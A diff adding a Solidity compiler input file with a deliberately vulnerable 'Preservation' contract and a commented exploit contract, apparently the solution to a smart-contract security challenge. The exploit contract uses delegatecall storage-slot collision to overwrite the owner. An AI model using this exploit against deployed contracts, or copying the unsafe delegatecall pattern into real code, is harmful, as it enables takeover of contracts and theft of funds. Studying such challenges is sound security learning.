@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Preservation.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Preservation {\n    // public library contracts\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    uint storedTime;\n    // Sets the function signature for delegatecall\n    bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\n        timeZone1Library = _timeZone1LibraryAddress;\n        timeZone2Library = _timeZone2LibraryAddress;\n        owner = msg.sender;\n    }\n\n    // set the time for timezone 1\n    function setFirstTime(uint _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n\n    // set the time for timezone 2\n    function setSecondTime(uint _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n    // stores a timestamp\n    uint storedTime;\n\n    function setTime(uint _time) public {\n        storedTime = _time;\n    }\n}\n\n//-n Setup an exploit library contract that stores 3 values\n//-n dummy 1 and dummy 2 correspond to storage slots of timeZone1Library & timeZone2Library in the preservation contract\n//-n owner corresponds to the storage slot of owner in the Preservation contract\n\n//-n if we can somehow change the address of `timeZone1Library` contract\n//-n we can deploy our own exploit contract that can override the storage slot of owner\n//-n this can take complete control of the Preservation contract\ncontract ExploitLibraryContract {\n    uint dummy1;\n    uint dummy2;\n    address owner;\n\n    //-n we use the same signature as defined in Preservation contract\n    //-n if next time setTime gets called with an address corresponding to this exploit library\n    //-n owner storage slot will be overwritten with the address we are inputting -> enabling a full control on contract\n    function setTime(uint _address) public {\n        owner = convertUintToAddress(_address);\n    }\n\n    //-n helper function to convert address to uint256\n    function convertAddressToUint(address _input) public pure returns (uint) {\n        return uint256(uint160(_input));\n    }\n\n    //-n helper function to convert uint256 to address\n    function convertUintToAddress(uint _value) public pure returns (address) {\n        return address(uint160(_value));\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
